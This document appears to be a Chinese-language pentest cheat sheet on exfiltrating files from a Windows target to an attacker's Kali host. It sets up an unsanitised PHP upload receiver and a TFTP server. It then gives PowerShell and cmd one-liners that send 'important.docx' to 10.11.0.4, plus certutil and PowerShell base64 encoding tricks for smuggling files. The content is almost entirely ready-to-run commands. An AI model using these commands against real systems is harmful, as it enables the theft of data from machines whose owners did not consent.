# windows上传

1. ps下回传

```bash
1. 创建脚本

mkdir /var/www/uploads
cd /var/www/uploads
==================upload.php===================
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
================================================

2. 开启apche
/etc/init.d/apache2 start
检查
ps -ef | grep apache  

3. 赋权
sudo chown www-data: /var/www/uploads

4. 执行
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```

1. cmd下老系统回传

```bash
1. kali创建ftp环境（开启在udp69端口）
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp

2. windows执行开始回传
tftp -i 10.11.0.4 put important.docx
```

1. cmd编码法

```bash
certutil -f -encode test.exe key.txt
base64编码就保存在了key.txt文本
```

1. ps编码法

```bash
$file = 'C:\zipfile.zip'
$filebytes = Get-Content $file -Encoding byte
$fileBytesBase64 = [System.Convert]::ToBase64String($filebytes)
$fileBytesBase64 | Out-File 'C:\base64encodedString.txt'
```
